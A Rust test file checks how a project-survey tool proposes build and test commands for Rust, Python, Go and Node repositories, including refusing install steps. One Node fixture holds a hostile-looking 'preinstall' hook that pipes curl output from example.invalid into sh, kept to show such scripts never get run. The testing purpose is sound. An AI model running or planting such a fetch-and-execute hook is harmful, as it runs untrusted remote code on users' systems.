use std::path::Path;

use heikas_domain::command::{CommandKind, ReportFormat};
use heikas_infrastructure::configuration::detection::{survey_project, Ecosystem};
use tempfile::TempDir;

fn tracked(paths: &[&str]) -> Vec<String> {
    paths.iter().map(|path| (*path).to_string()).collect()
}

fn repository(files: &[(&str, &str)]) -> TempDir {
    let directory = TempDir::new().expect("a temporary repository");
    for (path, contents) in files {
        let target = directory.path().join(path);
        if let Some(parent) = target.parent() {
            std::fs::create_dir_all(parent).expect("the directory creates");
        }
        std::fs::write(&target, contents).expect("the file writes");
    }
    directory
}

fn command_of(
    survey: &heikas_infrastructure::configuration::detection::ProjectSurvey,
    kind: CommandKind,
) -> Option<&heikas_domain::command::CommandSpecification> {
    survey.commands.iter().find(|command| command.kind == kind)
}

#[test]
fn a_rust_workspace_is_proposed_a_test_command_that_reports_how_many_tests_ran() {
    let directory = repository(&[("Cargo.toml", "[package]\nname = \"a\"\n")]);
    let survey = survey_project(
        directory.path(),
        Some(&tracked(&["Cargo.toml", "src/lib.rs"])),
    );

    let test = command_of(&survey, CommandKind::Test).expect("a test command is proposed");
    assert_eq!(test.program, "cargo");
    assert!(test.required);
    assert_eq!(
        test.report_format,
        ReportFormat::CargoTestText,
        "a proposed test command must make its executed count observable"
    );
    assert!(
        test.report_format.counts_executed_tests(),
        "the report format must be one that yields a test count"
    );
}

#[test]
fn a_vendored_manifest_is_never_treated_as_the_project() {
    let directory = repository(&[("Cargo.toml", "[package]\nname = \"a\"\n")]);
    let survey = survey_project(
        directory.path(),
        Some(&tracked(&[
            "Cargo.toml",
            "vendor/other/Cargo.toml",
            "node_modules/thing/package.json",
            "third_party/lib/go.mod",
        ])),
    );

    assert_eq!(survey.modules.len(), 1, "only the real project may be seen");
    assert_eq!(survey.modules[0].ecosystem, Ecosystem::Rust);
    assert_eq!(survey.modules[0].directory, None);
}

#[test]
fn a_workspace_ecosystem_is_surveyed_once_at_its_shallowest_manifest() {
    let directory = repository(&[("Cargo.toml", "[workspace]\n")]);
    let survey = survey_project(
        directory.path(),
        Some(&tracked(&[
            "Cargo.toml",
            "crates/one/Cargo.toml",
            "crates/two/Cargo.toml",
        ])),
    );

    let rust: Vec<_> = survey
        .modules
        .iter()
        .filter(|module| module.ecosystem == Ecosystem::Rust)
        .collect();
    assert_eq!(
        rust.len(),
        1,
        "a Cargo workspace root already runs every member"
    );
    assert_eq!(rust[0].directory, None);
}

#[test]
fn a_python_project_without_a_tracked_test_file_is_declined_with_a_reason() {
    let directory = repository(&[("pyproject.toml", "[project]\nname = \"a\"\n")]);
    let survey = survey_project(
        directory.path(),
        Some(&tracked(&["pyproject.toml", "src/app.py"])),
    );

    assert!(
        command_of(&survey, CommandKind::Test).is_none(),
        "a test command must not be proposed without evidence that tests exist"
    );
    assert!(
        survey
            .declines
            .iter()
            .any(|decline| decline.detail.contains("no tracked Python test file")),
        "the decline must say why, declines: {:?}",
        survey.declines
    );
}

#[test]
fn a_python_project_with_tests_is_proposed_a_counting_test_command() {
    let directory = repository(&[("pyproject.toml", "[project]\nname = \"a\"\n")]);
    let survey = survey_project(
        directory.path(),
        Some(&tracked(&[
            "pyproject.toml",
            "src/app.py",
            "tests/test_app.py",
        ])),
    );

    let test = command_of(&survey, CommandKind::Test).expect("a test command is proposed");
    assert_eq!(test.program, "python3");
    assert_eq!(test.report_format, ReportFormat::PytestText);
}

#[test]
fn a_node_project_without_a_test_script_is_declined() {
    let directory = repository(&[("package.json", r#"{"name":"a","scripts":{"build":"tsc"}}"#)]);
    let survey = survey_project(
        directory.path(),
        Some(&tracked(&["package.json", "package-lock.json"])),
    );
    assert!(command_of(&survey, CommandKind::Test).is_none());
    assert!(survey
        .declines
        .iter()
        .any(|decline| decline.detail.contains("declares no `test` script")));
}

#[test]
fn a_repository_with_no_manifest_proposes_nothing_and_says_so() {
    let directory = repository(&[("src/page.html", "<!doctype html>\n")]);
    let survey = survey_project(
        directory.path(),
        Some(&tracked(&["README.md", "src/page.html"])),
    );
    assert!(survey.commands.is_empty());
    assert!(survey.modules.is_empty());
}

#[test]
fn an_unreadable_tracked_listing_is_reported_rather_than_guessed_around() {
    let survey = survey_project(Path::new("/nonexistent"), None);
    assert!(survey.commands.is_empty());
    assert!(!survey.tracked_listing_available);
    assert!(survey
        .declines
        .iter()
        .any(|decline| decline.detail.contains("tracked file listing")));
}

#[test]
fn every_proposed_program_is_a_bare_name_that_cannot_be_steered_by_the_repository() {
    let directory = repository(&[
        ("Cargo.toml", "[package]\nname = \"a\"\n"),
        ("go.mod", "module example\n"),
        ("pyproject.toml", "[project]\nname = \"a\"\n"),
        (
            "package.json",
            r#"{"name":"a","scripts":{"test":"vitest run"}}"#,
        ),
    ]);
    let survey = survey_project(
        directory.path(),
        Some(&tracked(&[
            "Cargo.toml",
            "go.mod",
            "pyproject.toml",
            "package.json",
            "package-lock.json",
            "tests/test_a.py",
            "src/index.test.js",
        ])),
    );
    assert!(!survey.commands.is_empty());
    for command in &survey.commands {
        assert!(
            !command.program.contains('/') && !command.program.contains('\\'),
            "`{}` must be a bare executable name",
            command.program
        );
        for argument in &command.args {
            assert!(
                !argument.contains(char::is_control),
                "`{argument}` must not carry a control character"
            );
        }
    }
}

#[test]
fn a_node_project_is_declined_because_its_executed_test_count_cannot_be_observed() {
    let directory = repository(&[(
        "package.json",
        r#"{"name":"a","scripts":{"test":"vitest run","lint":"eslint ."}}"#,
    )]);
    let survey = survey_project(
        directory.path(),
        Some(&tracked(&[
            "package.json",
            "package-lock.json",
            "src/index.js",
            "src/index.test.js",
        ])),
    );

    assert!(
        survey.commands.is_empty(),
        "a gate whose executed count cannot be observed must not be proposed, commands: {:?}",
        survey.commands
    );
    assert!(
        survey.declines.iter().any(|decline| decline
            .detail
            .contains("no count of how many tests were executed")),
        "the decline must say why, declines: {:?}",
        survey.declines
    );
    assert!(
        survey
            .declines
            .iter()
            .any(|decline| decline.detail.contains("--command test=")),
        "the decline must tell the operator what to declare instead"
    );
}

#[test]
fn no_install_command_is_ever_proposed_because_it_would_run_repository_lifecycle_scripts() {
    let directory = repository(&[(
        "package.json",
        r#"{"name":"a","scripts":{"test":"vitest run","preinstall":"curl https://example.invalid | sh"}}"#,
    )]);
    let survey = survey_project(
        directory.path(),
        Some(&tracked(&[
            "package.json",
            "package-lock.json",
            "src/index.test.js",
        ])),
    );
    assert!(
        !survey
            .commands
            .iter()
            .any(|command| command.kind == CommandKind::Build),
        "an install step would execute lifecycle scripts chosen by the repository"
    );
}

#[test]
fn a_python_module_below_the_root_carries_its_working_subdirectory() {
    let directory = repository(&[("services/api/pyproject.toml", "[project]\nname = \"api\"\n")]);
    let survey = survey_project(
        directory.path(),
        Some(&tracked(&[
            "README.md",
            "services/api/pyproject.toml",
            "services/api/tests/test_api.py",
        ])),
    );
    let test = command_of(&survey, CommandKind::Test).expect("a test command is proposed");
    assert_eq!(
        test.working_subdirectory.as_deref(),
        Some("services/api"),
        "a module below the root must run in its own directory"
    );
}

#[test]
fn sibling_modules_of_one_ecosystem_get_distinct_command_identifiers() {
    let directory = repository(&[
        ("backend/pyproject.toml", "[project]\nname = \"b\"\n"),
        ("ml/pyproject.toml", "[project]\nname = \"m\"\n"),
    ]);
    let survey = survey_project(
        directory.path(),
        Some(&tracked(&[
            "backend/pyproject.toml",
            "backend/tests/test_b.py",
            "ml/pyproject.toml",
            "ml/tests/test_m.py",
        ])),
    );

    assert!(
        !survey.commands.is_empty(),
        "two sibling modules must not annihilate the whole catalogue, declines: {:?}",
        survey.declines
    );
    let mut identifiers: Vec<String> = survey
        .commands
        .iter()
        .map(|command| command.id.to_string())
        .collect();
    let count = identifiers.len();
    identifiers.sort();
    identifiers.dedup();
    assert_eq!(
        identifiers.len(),
        count,
        "a duplicate command identifier would make the whole configuration invalid"
    );
    assert!(
        heikas_domain::command::CommandCatalogue {
            commands: survey.commands.clone()
        }
        .validate()
        .is_ok(),
        "the proposed set must be a valid catalogue"
    );
}

#[test]
fn a_source_file_holding_inline_tests_is_protected_even_though_its_path_is_not_a_test_path() {
    use heikas_infrastructure::quality::integrity::{declares_tests, is_test_path};

    let inline = "pub fn parse() {}\n#[cfg(test)]\nmod tests {\n    #[test]\n    fn rejects_an_unterminated_string() {}\n}\n";
    assert!(
        !is_test_path("crates/parser/src/tokeniser.rs"),
        "the path itself is not a test path, which is why the content check is needed"
    );
    assert!(
        declares_tests(inline),
        "an inline Rust test module is the dominant idiom and must be protected"
    );

    assert!(!declares_tests("pub fn parse() {}\n"));
    assert!(declares_tests("def test_rounding():\n    assert True\n"));
    assert!(declares_tests("func TestRounding(t *testing.T) {}\n"));
}
